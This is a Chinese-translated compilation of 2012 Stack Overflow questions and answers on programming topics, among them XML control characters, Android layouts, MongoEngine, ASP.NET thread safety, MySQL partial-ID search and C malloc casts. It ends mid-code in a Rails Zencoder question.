## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:29:28.533

字符引用`&#x12;`和`&#x13;`表示 XML 1.0 中不允许的控制字符。这里真正的问题是它们不表示文本中的字符。字符“↨‼”是U+21A8 UP DOWN ARROW WITH BASE 和U+203C DOUBLE EXCLAMATION MARK，所以应该写成`&#x21a8;&#x203c;`。

得到奇数字符引用的原因可能是在 CP437 编码中，“↨‼”位于代码位置 12 和 13（十六进制）。所以这是一个编码混乱，一些转换应用了错误的转换。在 XML 中，字符引用中的数字始终表示 Unicode 代码编号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:04:40.023

[XML 1.0 版文档不支持](http://en.wikipedia.org/wiki/XML#Valid_characters)这些控制字符。

您应该能够`version`在文档的属性中将您的版本更改为 1.1，在这种情况下，文档应该验证。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-23T06:56:10.107

我解决了我的问题。

此字符来自 ORACLE 数据库上的 SQL obtenues 视图。ORACLE 上的字符 -> 由 SQL SERVER 上的 ↨ 解释。

在我看来，我会做一个替换

# android - Android - 动态 ColSpan 不起作用

> ID：12068556
> 
> 赞同：0
> 
> 时间：2012-08-22T07:50:54.230
> 
> 标签：android, android-layout, android-tablelayout

我的一项活动中有两个表格行。第一行将始终包含 2 个文本视图，第二行可能包含一个或两个文本视图（取决于用户输入）。每当我在第二行有一个 textview 时，我都试图将它跨越到两列。我正在尝试这个

```
TableRow.LayoutParams param = (LayoutParams)editText.getLayoutParams();
param.span = 2;
txtView.setLayoutParams(param); 
```

但它不起作用。发生的情况是，第一行中的第二个 txtview 被推出屏幕。那么这里的任何人都可以告诉我在哪里犯错了吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-27T17:23:30.843

我做了这个例子，希望对你有帮助。

```
 TableLayout table = (TableLayout)findViewById(R.id.table_id_in_xml);
    TableRow row = new TableRow(this);
    TableRow row2 = new TableRow(this);
    TextView col1, col2, col3;        

    row.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
    row2.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));

    col1 = new TextView(this);
    col2 = new TextView(this);
    col3 = new TextView(this);

    col1.setText("col1");
    col2.setText("col2");
    col3.setText("col3");

    row.addView(col1);
    row.addView(col2);
    row.addView(col3);

    table.addView(row, new TableLayout.LayoutParams( LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));

    //HERE IS WHAT YOU NEED
    TableRow.LayoutParams params = (TableRow.LayoutParams) row2.getLayoutParams();
    params.span = 3; //amount of columns you will span

    col1 = new TextView(this);

    col1.setText("span on col1 makes it bigger than the others");
    col1.setLayoutParams(params);
    row2.addView(col1);

    table.addView(row2, new TableLayout.LayoutParams( LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-02-01T01:15:45.720

解释标记为正确的答案 - 看起来您需要在将视图添加到其父级后设置布局参数。例如，将 textview 添加到一行，然后设置布局参数

# mongodb - 一起使用 MongoEngine 和 PyMongo

> ID：12068558
> 
> 赞同：26
> 
> 时间：2012-08-22T07:50:55.743
> 
> 标签：mongodb, pymongo, mongoengine

我想在下一个项目中使用[MongoEngine](http://mongoengine.org/)。现在我想知道我是否也可以在同一个项目中直接使用[PyMongo 。](http://api.mongodb.org/python/current/)只是为了我需要一些不直接通过 mongoengine 支持的非常特殊的东西。

是否有人怀疑这会起作用，或者我不应该这样做！？

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-08-22T08:07:26.903

这里是 MongoEngine 的作者 - MongoEngine 是基于 pymongo 构建的，因此您当然可以放入 pymongo - 或在您的代码中使用原始 pymongo！

有一些文档助手允许您访问 MongoEngine 中的原始 pymongo 方法，例如：

```
class Person(Document):
    name = StringField()

# Access the pymongo collection for the Person document
collection = Person._get_collection()
collection.find_one()  # Use raw pymongo to query data 
```

# php - Symfony2 学说对象 - 为什么新创建的对象为空？

> ID：12068563
> 
> 赞同：1
> 
> 时间：2012-08-22T07:51:36.103
> 
> 标签：php, symfony, doctrine

我在控制器操作中有以下代码：

```
public function someAction()
{
    // ...
    $promo_repo = $em->getRepository('AcmeContactlistBundle:Promotion');
    $default_promo_code = $this->container->getParameter('promo_default_code');
    $promo = $promo_repo->findOneByCode($default_promo_code);

    if (empty($promo)) {
        $promo = new Promotion();
        $promo->setCode($default_promo_code);
        $start_date  = $this->container->getParameter('promo_default_start_date');
        $expiry_date = $this->container->getParameter('promo_default_end_date');
        $promo->setStartsAt(new \DateTime($start_date));
        $promo->setExpiresAt(new \DateTime($expiry_date));
        $em->persist($promo);
        $em->flush();
    }

    $contact = new Contact();
    $contact->setPromotion($promo); // <-  Error here. See error msg below

    // Some more code follows ...
} 
```

**错误信息**

> PHP Catchable 致命错误：传递给 Acme\ContactlistBundle\Entity\Contact::setPromotion() 的参数 1 必须是 Acme\ContactlistBundle\Entity\Promotion 的实例，给定 null，...

我检查了上述语句生成的 SQL，并检查以确保记录被持久保存到促销表（如果不存在）。促销对象已正确创建并保存到数据库中，所以我不明白在将其分配给联系人变量时，它的值为 null。

出了什么问题？

# android - 如何让图形自动适应安卓手机和平板的不同尺寸？

> ID：12068574
> 
> 赞同：1
> 
> 时间：2012-08-22T07:52:07.630
> 
> 标签：android

我写了一个android应用程序，但我发现应用程序的图形在不同尺寸的android手机中具有不同的性能。有些图形甚至会在平板电脑中变得非常糟糕。因此，我想知道如何调整程序代码，使应用程序可以自动适应安卓手机和平板电脑的不同大小。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:31:45.697

There are two important parameters which needs to taken cared when you are designing an app which
should run on multiple devices:

*   size(physical size of the device)
*   density of the device

Size: Size of a device in android is not defined as a unique physical value but as a range.
These are: small, normal, large and xlarge.

Density: Density is also defined as a range.
These are: ldpi, mdpi, hdpi and xhdpi.

![enter image description here](../Images/b4a6d54e3e277ac71bb631dd1134fde3.png)

For handling size you need to use have multiple layouts, one for each category of the size and you need to use different dp value for the height and width of the views for each of the layout as the sizeof a small and a large device will not be same.

For handling density you need to using different drawables for different screen densities i.e you need to place different density drawables in different drawable folders.
Eg:
These are the resolutions for a particular drawable

*   36x36 for low-density (placed in drawable-ldpi)
*   48x48 for medium-density (placed in drawable-mdpi)
*   72x72 for high-density (placed in drawable-hdpi)
*   96x96 for extra high-density (placed in drawable-xhdpi)

The ratio for this variation of the resolution is 3:4:6:8(ldpi:mdpi:hdpi:xhdpi)

For further reading you can refer to this android developer's link:
[http://developer.android.com/guide/practices/screens_support.html](http://developer.android.com/guide/practices/screens_support.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T09:41:41.457

在 xml 布局中使用**WaitSum 。**

Waitsum 会自动设置不同尺寸密度的布局和视图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:05:08.973

1.  使用相对布局

2.  为每个密度准备图形（ldpi、mdpi、hdpi、xhdpi）

3.  九个补丁你的图形。

# c++ - TIFF 现场版

> ID：12068578
> 
> 赞同：0
> 
> 时间：2012-08-22T07:52:13.357
> 
> 标签：c++, tiff, gdal

我需要重写一些未压缩的 tiff 文件行。问题是我需要这样做而不将整个文件复制到另一个地方。

我发现的唯一方法是阅读规范并编写我自己的代码来处理 tiff 文件。

libtiff 不允许打开文件进行读写。libgeotiff 是基于 libtiff 的。gdal 也不允许就地编辑文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T06:03:26.170

GDAL 是执行此操作的最佳库。

# c# - 如何使用 C# 读取具有不同单元格宽度的 MS 单词表内容

> ID：12068580
> 
> 赞同：1
> 
> 时间：2012-08-22T07:52:18.583
> 
> 标签：c#, ms-word

我正在使用 C# 阅读 MS Word 表格内容，但我不知道如何获取合并的单元格信息。像这样的表：

```
     ---------------------
     | c(1,1)| c(1,2) |
     |--------------------
     | c(2,1) | c(2,2)|

     |--------------------
     | c(3,1) |
     |-------------------|

```

单元格 c(3,1) 是合并单元格，但我无法获取信息。我的代码：

```
for (int i = 1; i <= doc.Tables.Count; i++)
{
    Microsoft.Office.Interop.Word.Table nowTable = doc.Tables[i];
    for (int rowPos = 1; rowPos <= nowTable.Rows.Count; r
    {
        for (int columPos = 1; columPos <= nowTable.Colum)
        {

            String strContent = nowTable.Cell(rowPos, columPos).Range.Text;                
        }
    }
} 
```

# c# - 在 ASP.NET 网站中使用堆栈集合

> ID：12068585
> 
> 赞同：0
> 
> 时间：2012-08-22T07:52:33.373
> 
> 标签：c#, asp.net, asp.net-mvc, thread-safety

我需要在我的 asp.net 项目中使用在类中创建的堆栈集合

```
public class ExpressionsEvaluator
{
    public Stack<ExpressionParameter> expressionParameters = new Stack<ExpressionParameter>();

    public object EvaluateExpression()
    {
        // calculate expression patamers
        expressionParameters.Push(parameter);

        // Do some functions

        // remove the last parameters
        expressionParameters.Pop();
    }
} 
```

这种方法线程安全吗？

每个访问网站的用户的 expressionParameters 对象是否不同？

**用例：**

```
 public ActionResult EvaluateExpression(string expression)
    {
        try
        {
            ExpressionsEvaluator expressionEvaluator = new ExpressionsEvaluator();
            object result = expressionEvaluator.EvaluateExpression(expression);
            return Json(result, JsonRequestBehavior.AllowGet);
        }
        catch (Exception ex)
        {
            return Json(new { hasError = true }, JsonRequestBehavior.AllowGet);
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:07:46.673

> 这种方法线程安全吗？

是的，这个类本身是线程安全的。这就是你如何使用它。

> 每个访问网站的用户的 expressionParameters 对象是否不同？

这取决于您如何使用它以及存储它的位置。如果您在网页中创建它的实例，那么它将是每个页面请求的全新实例。如果您创建一个实例但将其存储在某个地方，那么这取决于该存储的工作方式。如果您使用会话，那么是的，每个用户都有自己的实例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:58:44.303

好吧，我假设您使用的是 .NET Framework 4.0。

.NET 4.0 框架在 System.Collections.Concurrent 命名空间中引入了线程安全集合：请参见[此处](http://msdn.microsoft.com/en-us/library/system.collections.concurrent.aspx)和[此处](http://msdn.microsoft.com/en-us/library/dd997305.aspx)

**ConcurrentBag** 表示一个线程安全的、无序的对象集合。

**ConcurrentDictionary** 表示可由多个线程同时访问的键值对的线程安全集合。

**ConcurrentQueue** 表示线程安全的先进先出 (FIFO) 集合。

**ConcurrentStack** 表示线程安全的后进先出 (LIFO) 集合。

.NET Framework 中的其他集合默认情况下不是线程安全的，需要为每个操作锁定：

```
lock (mySetNeedToBeLock)
{
    mySetNeedToBeLock.Add("my information in set");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:03:52.460

这完全取决于您将如何实际使用`ExpressionsEvaluator`.

就目前而言，代码根本不使用任何线程安全，因此消费者将不得不，例如通过[锁定](http://www.albahari.com/threading/part2.aspx#_Locking)对共享`ExpressionsEvaluator`实例的访问。

至于您的第二个问题，您可能想了解[ASP.NET 中的会话管理](http://msdn.microsoft.com/en-us/library/ms178581%28v=vs.100%29.aspx)

# php - 用php将视频从iphone设备上传到服务器

> ID：12068591
> 
> 赞同：0
> 
> 时间：2012-08-22T07:53:04.633
> 
> 标签：php, video

我正在从事的项目包括从 iphone 设备上传用户的图像和视频。我正在用 PHP 处理后端。对于上传图片，我得到了 base64encode 字符串，并且我使用以下代码上传图片 -

```
$str = $data['pictureurl'];  // base64encode string 

$newVar = base64_decode($str);

define('UPLOAD_DIR', 'userimages/');

$img = $str;
$date = strtotime(date("m-d-y H:i:s"));

$img = str_replace('data1:image/png;base64,', '', $img);

$img = str_replace(' ', '+', $img);

$data1 = base64_decode($img);

$file = UPLOAD_DIR . strtolower($data['firstName']).strtolower($data['lastName']). "_".$userId . '.png';

$totalpath = $path.$file;

@chmod('userimages/', 0777);
$success = file_put_contents($file, $data1); 
```

从此代码中，图像以 .png 扩展名正确上传到指定目录中的服务器。我可以使用相同的代码上传文件类型为 .flv 或 .mov 的视频吗？我已经尝试过了，但是文件被放置在具有 0 字节数据的文件夹中。可能是什么问题呢？还是有其他解决方案可以上传此类文件？

# mysql - 如何在 MySQL 中搜索多个完整值和部分值？

> ID：12068597
> 
> 赞同：1
> 
> 时间：2012-08-22T07:53:30.973
> 
> 标签：mysql, search, sql-like

我正在运行在`Coldfusion8/MySQL 5.0.88`数据库上运行的应用程序。

该应用程序有一个搜索表单，用户可以使用它来搜索产品 ID。

现在我的 SQL 语句如下所示：

```
 ...
  AND a.product_id LIKE <cfqueryparam value="%#form.s_product_id#%" cfsqltype="cf_sql_varchar"> 
```

用户通常会传入 a `single id` or `partial id`，所以我需要这对两者都有效：

```
 123456 (full id)
   123 (partial id) 
```

但是，我还想让用户搜索多个 ID。所以用户可能会输入：

```
 12345,233345,78876 
```

**问题**：
我可以在提交表单之前清除空格，但我如何才能使我的 MySQL 搜索处理程序正确地将其识别为列表。如果我只是使用`IN`而不是`LIKE`我会丢失 partial_ID，不是吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:36:32.337

我不喜欢冷融合，但您需要用逗号分割 ID 列表并构建如下查询：

```
... AND (a.product_id LIKE '%12345%' OR a.product_id LIKE '%123%' OR a.product_id LIKE '%78876%') ... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:38:44.663

因此，一个有效的 ColdFusion 解决方案可能是：

```
 <cfquery name="your_query_name" datasource="your_datasource">
    SELECT column1, column2
    FROM a
    WHERE condition=whatever
    <cfif listlen(form.s_product_id)>
       AND (1=0 /* always false; for SQL syntax only */
       <cfloop list="#form.s_product_id#" index="variables.s_product_id_ii">
         OR a.product_id LIKE <cfqueryparam value="%#variables.s_product_id_ii#%" cfsqltype="cf_sql_varchar" />
       </cfloop>)
    </cfif>
    </cfquery> 
```

如果 'a.product_id' 是一个整数字段，请考虑将其转换为 VARCHAR

```
 CAST(a.product_id AS VARCHAR(50)) LIKE <cfqueryparam... 
```

所以这个查询不会在不同的、更严格的数据库上中断。或者，由于您将 form.s_product_id 列表拆分为其组件整数，您可以将 cfqueryparam cfsqltype 更改为“cf_sql_integer”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-14T12:50:11.830

```
<?php
include('config.php');
if (!empty($_REQUEST['term'])) {

$term = mysql_real_escape_string($_REQUEST['term']);     

$sql ="Select product.id,costomer.name,costomer.mobile,product.cid,product.pname,product.model,product.date,product.harddisk,product.ram,product.damage,product.driver,product.status from product INNER JOIN costomer
ON costomer.cid=product.cid WHERE id LIKE '%".$term."%'
OR name LIKE '%".$term."%',
OR pname LIKE '%".$term."%',
OR model LIKE '%".$term."%',
OR statusLIKE '%".$term."%',";

$r_query = mysql_query($sql); 
?>

<?php
while ($row = mysql_fetch_array($r_query)){  

echo '<tr><td>' .$row['id'].'</td>';  
echo '<td>'.$row['name'].'</td>';
echo '<td>' .$row['pname'].'-'.$row['model'].'</td>';  
echo '<td>'.$row['mobile'].'</td>';
echo '<td>'.$row['status'].'</td>';

}  
echo '</tr>';
}

?> 
```

# c# - Gridview，将文本单元格转换为代码后面的按钮

> ID：12068601
> 
> 赞同：0
> 
> 时间：2012-08-22T07:53:44.057
> 
> 标签：c#, asp.net, gridview, code-behind

我有一个 gridview，它有来自 SQL 数据库的数据。数据库包含一组需要处理的作业。在我的最后一个专栏中，它说它是否已完成。如果完成，它将显示完成时间的日期时间，但如果没有完成，则数据库包含此单元格的 0，并且需要一个可以使其完成的按钮，当它完成时。

因此代码首先从数据库中检索数据，然后我想使用 RowDataBound 检查我是否需要显示一个按钮，而不是来自数据库的文本。我还需要这个按钮的事件，所以我可以在完成后使用 dateTime 更新数据库。

这是我的gridview的代码：

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
DataSourceID="OverviewPlannedJobs" DataKeyNames="ID" 
        onrowcommand="Gridview1_RowCommand" onrowdatabound="GridView1_RowDataBound" 
        Width="631px">
    <Columns>
        <asp:BoundField DataField="ID" HeaderText="ID" SortExpression="ID" 
            InsertVisible="False" ReadOnly="True">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="week" HeaderText="Uke" SortExpression="week">
        <HeaderStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="dayNumb" HeaderText="Dag" 
            SortExpression="dayNumb">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="oven" HeaderText="Ovn" 
            SortExpression="oven">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="section" HeaderText="Seksjon" 
            SortExpression="section">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="pit" HeaderText="Pit" SortExpression="pit">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="job" HeaderText="Jobb" 
            SortExpression="job">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="priority" HeaderText="Prioritet" 
            SortExpression="priority">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:BoundField DataField="timeEdited" HeaderText="Lagt til eller endret" 
            SortExpression="timeEdited" >
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:BoundField>
        <asp:ButtonField ButtonType="Button" CommandName="editts" HeaderText="Valg" 
            Text="Rediger">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:ButtonField>
        <asp:ButtonField ButtonType="Button" CommandName="delete" Text="Slett">
        <ItemStyle HorizontalAlign="Center" VerticalAlign="Middle" />
        </asp:ButtonField>
        <asp:TemplateField HeaderText="Fullført?" SortExpression="finished">
            <ItemTemplate>
                <asp:Label ID="Label1" runat="server" Text='<%# Bind("finished") %>'></asp:Label>
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView> 
```

然后我在后面的代码中有这个rowdatabound函数：

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
    {

        //Make button where finished equals zero
        if (e.Row.Cells[11].Text.Equals("0"))
        {
            //insert button
        }

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T12:23:06.980

对不起，它不适合我。不知道为什么，但在其中之一出现错误

```
DataRow row = ((DataRowView)e.Row.DataItem).Row;
        string value0 = row[3].ToString(); 
```

我没有自己的数据绑定方法，因为我使用了 gridview 的配置数据源。

想我会尝试制作一个按钮项目模板，然后根据数据库结果更改文本或禁用按钮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T07:59:22.887

试试这个我已经测试过

**代码背后：**

```
 protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.DataRow)
        {
            DataRow row = ((DataRowView)e.Row.DataItem).Row;
            string value0 = row[3].ToString();
            if (value0 == "0")
            {
                e.Row.Cells[2].Text = "";
                Button btn=new Button();
                btn.Text="finish";
                e.Row.Cells[2].Controls.Add(btn);
            }
        }
    }
 protected void Page_Load(object sender, EventArgs e)
    {
        gvBind();
    }
    public void gvBind()
    {
        SqlDataAdapter dap=new SqlDataAdapter("select id,name,job,status from myTable",con);
        DataSet ds = new System.Data.DataSet();
        dap.Fill(ds);
        GridView1.DataSource = ds.Tables[0];
        GridView1.DataBind();
    } 
```

**默认.aspx：**

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="false" 
        onrowdatabound="GridView1_RowDataBound">
        <Columns>
            <asp:TemplateField HeaderText="Name">
                <ItemTemplate >
                <asp:Label ID="l1"   Text='<%# Bind("name") %>' runat="server"></asp:Label>
                </ItemTemplate>
            </asp:TemplateField>

            <asp:TemplateField HeaderText="Job">
                <ItemTemplate >
                <asp:Label id="l2" Text='<%# Bind("job") %>' runat="server"></asp:Label>
                </ItemTemplate>
            </asp:TemplateField>

           <asp:TemplateField HeaderText="Status">
           <ItemTemplate >
            <asp:Label ID="l3" Text='<%# Bind("status") %>' runat="server"></asp:Label>
           </ItemTemplate>
            </asp:TemplateField>
        </Columns>
    </asp:GridView> 
```

**截图**： ![在此处输入图像描述](../Images/fc09886f2b2c975d73d07d17eb2485be.png)

如果有帮助，请标记答案:)

# jquery - IE9文件上传后不调用ajax方法

> ID：12068604
> 
> 赞同：0
> 
> 时间：2012-08-22T07:53:47.800
> 
> 标签：jquery, internet-explorer-9

我创建了一个简单的文件上传页面。为了保持简单，我避免使用 iFrame 来包含文件输入。因此，文件提交会触发页面重新加载，因为表单已提交。这是为了在页面上显示上传的文件名所必需的。文件名是通过 jQuery 中的 AJAX 调用获取的。

在 Mac 和 windows 上的 Chrome、Firefox、Opera、Safari 中，一切都像魅力一样工作（我没有测试过 Linux，但我想它也可以）

我的问题是，在 IE9 中，当我打开浏览器时，会进行 ajax 调用并显示数据。但是一旦上传了文件，这将停止工作。

为了确定，服务器是在调试模式下启动的，我在服务方法中设置了一个断点。只要没有上传文件，就会到达断点。

一旦上传了文件（顺便说一句，这有效），就不再达到断点。IE9 不调用服务方法，数据不再变化。即使导航到另一个页面 (google.com) 并通过编写 URL 再次加载该页面也无济于事。

这是迄今为止我在浏览器中看到的最奇怪的行为：提交了表单并发送了文件，但是没有执行后续的 ajax 调用并且页面没有更改。但是 javascript 的行为就像是进行了 AJAX 调用。只是不再涉及服务器。

这是表格：

```
 <form method="post" action="${pageContext.request.contextPath}/services/prepop/upload/csv"
          id="fileUploadForm" enctype="multipart/form-data">
       <div class="file-upload">
             <input id="uploadedFile"
                    type="file"
                    name="uploadedFile"
                    onchange="submit()"/>
       </div>
       <input type="hidden" name="formId" value='{{formId}}'/>
       <input type="hidden" name="contentId" value='{{id}}'/>
       <input type="hidden" name="page" value='upload'/>
    </form> 
```

这是ajax调用

```
 app.log( "getting the form files" );
   $.ajax( {
      url:"${pageContext.request.contextPath}/services/jsonrest/prepop/list",
      type:"GET",
      async:true,
      data:[
         {name:"formId", value:formId}
      ],
      success:function ( prepopContentList ) {
         app.log( "the content file list was fetched with " + prepopContentList.length + " entries" );
         upload.populateEntryList( prepopContentList, $( "#fileUploadList" ) );
      }
   } ); 
```

最奇怪的是日志条目出现在日志中，但始终具有相同的值。在调试模式下查看内容可以确认这一点。数组总是相同的。

没有启用彗星。这是一个简单的 jQuery 应用程序。

如果有人有线索。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T06:52:53.840

看起来 IE9 试图在缓存方面变得聪明，并缓存未明确设置为过期的所有内容。

我的解决方案是将响应（我使用泽西岛）更改为在抵达时过期。这就是它的工作原理。

正常回复：

```
return Response.ok( jsForms.toJSONString(), MediaType.APPLICATION_JSON_TYPE ).build(); 
```

过期回复：

```
return Response.ok( jsForms.toJSONString(), MediaType.APPLICATION_JSON_TYPE ).expires( new Date( 1000 ) ).build(); 
```

注意添加`expires( new Date( 1000 ) )`

那成功了。

# c - 指向malloc的指针？

> ID：12068610
> 
> 赞同：3
> 
> 时间：2012-08-22T07:54:13.717
> 
> 标签：c, pointers, struct

```
struct node* new_node =
            (struct node*) malloc(sizeof(struct node)); 
```

我不明白这里的*：`...(struct node*) malloc(siz...` 首先，* 属于node 还是malloc？这是什么意思？指针与内存函数 malloc 有什么关系？我真的对 * 位置感到困惑

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T08:14:06.830

C 中括号中的类型名称（例如`(struct node *)`）称为“强制转换”。这是一种将表达式类型更改为命名类型的方法，通常与指针一起使用。

但是，这是忽略[Do I cast the result of malloc](https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc)中的建议的代码。*这里不需要*演员表，这（在我看来，如果您遵循该链接，也许并不奇怪）相当糟糕的代码。

编写此分配的最佳方法是：

```
struct node * new_node = malloc(sizeof *new_node); 
```

这只提到了一次类型，放弃了可能引入错误并且阅读起来既无意义又麻烦的强制转换，并避免在指定要分配多少内存时引入脆弱性。赢了，赢了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:57:40.607

```
struct node     <= type
*new_node       <= pointer named new_node (of type struct node)
=               <= assignment
(struct node *) <= cast to pointer of type struct node
malloc(SIZE)    <= returns pointer of type void, thus needs cast 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:39:32.020

`(struct node*)`是*cast*，这是一种显式类型转换。`*`属于`struct node`，说明请求的类型是指向变量的指针`struct node`。malloc() 总是返回`void*`一个 void 指针。

malloc 的函数定义是`void* malloc (size_t size);`（在这种情况下也是`*`属于的`void`）。

编写您问题中发布的代码的人将此 void 指针转换为`struct node*`. 他们为什么这样做尚不清楚，他们要么对 C 中的指针转换如何工作感到困惑，而且也不知道这种转换的危险，要么代码是为 C++ 编写的。

C 语言中的 void 指针是一种通用指针类型，可以转换为任何其他指针类型，无需强制转换 (1)。

但是，在 C++ 中，转换 void 指针时必须始终进行强制转换，因为 C++ 具有比 C 更严格的类型转换规则并强制执行显式转换。

在 C 中强制转换 malloc() 的结果是危险的，并且被认为是一个错误 (2)，因为除非通过 #include 提供正确的函数原型，否则编译器默认行为会启动，它会错误地认为 malloc 返回 int。根据特定系统的指针和整数宽度，它可能工作得很好，或者可能导致程序崩溃和/或内存泄漏。

然而，在 C++ 中强制转换 malloc() 的结果是必要的。

* * *

参考：

1.  ISO 9899:2011 6.3.2.3/1。
2.  [具体来说，强制转换 malloc 的结果有什么危险？](https://stackoverflow.com/questions/1565496/specifically-whats-dangerous-about-casting-the-result-of-malloc)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:57:19.217

是`*`用于*类型*。这里的类型是 a `struct node*`（指向 a 的指针`struct node`）。

它不是“连接”到`malloc`功能，而是“连接”到类型。`malloc()`返回一个指针，因此您也将返回值分配为一个指针。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T08:51:49.007

它只是[类型转换](http://www.cprogramming.com/tutorial/c/lesson11.html)。

`malloc`返回一个[void](http://www.learncpp.com/cpp-tutorial/613-void-pointers/)指针（没有任何类型的指针）。 `(struct node *)`意味着您正在为`malloc`. 也看到[这个](https://stackoverflow.com/questions/4993327/is-typecast-required-in-malloc)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-22T09:12:46.063

这只是一个类型转换。实际上 malloc 函数返回 void pointer (void *) ，这意味着它不特定于任何数据结构或数据类型。它返回一个通用指针。通过类型转换，我们使返回值具体化，在这种情况下， (struct node *) 是指向结构节点类型的指针。

**简单来说，我们可以说我们正在将 void 指针 (void *) 转换为 struct 指针 (struct node *)。**

# ruby-on-rails - ArgumentError（缺少要链接的主机！请提供 :host 参数，设置 default_url_options[:host] Zencoder Ruby on Rails

> ID：12068611
> 
> 赞同：1
> 
> 时间：2012-08-22T07:54:15.257
> 
> 标签：ruby-on-rails, carrierwave

每当我尝试使用我的 Rails 应用上传视频时

显示以下错误：

```
ArgumentError (Missing host to link to! Please provide the :host parameter, set default_url_options[:host], or set :only_path to true):
  app/uploaders/media_uploader.rb:64:in `zencode'
  app/controllers/profile/videos_controller.rb:63:in `create' 
```

顺便说一下，我正在使用 Zencoder 和 Carrierwave

这是我的 media_uploader.rb

```
# encoding: utf-8

class MediaUploader < CarrierWave::Uploader::Base
    include Rails.application.routes.url_helpers
    Rails.application.routes.default_url_options = ActionMailer::Base.default_url_options

  # Include RMagick or MiniMagick support:
  # include CarrierWave::RMagick
  # include CarrierWave::MiniMagick

  # Choose what kind of storage to use for this uploader:
  #storage :file
    after :store, :zencode
    storage :fog

  # Override the directory where uploaded files will be stored.
  # This is a sensible default for uploaders that are meant to be mounted:
  def store_dir
    "uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{model.id}"
  end

    def cache_dir
        "#{Rails.root}/tmp/uploads"
    end

  # Provide a default URL as a default if there hasn't been a file uploaded:
  # def default_url
  #   "/images/fallback/" + [version_name, "default.png"].compact.join('_')
  # end

  # Process files as they are uploaded:
  # process :scale => [200, 300]
  #
  # def scale(width, height)
  #   # do something
  # end

  # Create different versions of your uploaded files:
  # version :thumb do
  #   process :scale => [50, 50]
  # end

  # Add a white list of extensions which are allowed to be uploaded.
  # For images you might use something like this:
   def extension_white_list
     %w(mp4 flv ogv avi)
   end

  # Override the filename of the uploaded files:
  # Avoid using model.id or version_name here, see uploader/store.rb for details.
   def filename
     #"video.mp4" if original_filename
        "video.mp4"
   end

    private
    def zencode(args)
        zencoder_response = Zencoder::Job.create({:input => "s3://peekbox.s3.amazonaws.com/uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{model.id}/video.mp4",
                                                                                            :outputs => [{:base_url => "s3://peekbox.s3.amazonaws.com/uploads/#{model.class.to_s.underscore}/#{mounted_as}/#{@model.id}",
                                                                                                                         :filename => "video.mp4",
                                                                                                                         :label => "web",
                                                                                                                         :notifications => [zencoder_callback_url(:protocol => "http", :host => ENV['URL'], :port => ENV['PORT'])],
                                                                                                                         :video_codec => "h264",
                                                                                                                         :audio_codec => "aac",
                                                                                                                         :quality => 3,
                                                                                                                         :width => 854,
                                                                                                                         :height => 480,
                                                                                                                         :format => "mp4",
                                                                                                                         :aspect_mode => "preserve",
                                                                                                                         :public => 1,
                                                                                                                            :thumbnails => {:base_url => "s3://peekbox.s3.amazonaws.com/uploads/#{model.class.to_s.underscore}/thumb/#{mounted_as}/#{@model.id}",
                                                                                                                            :width => 200,
                                                                                                                            :height => 114,
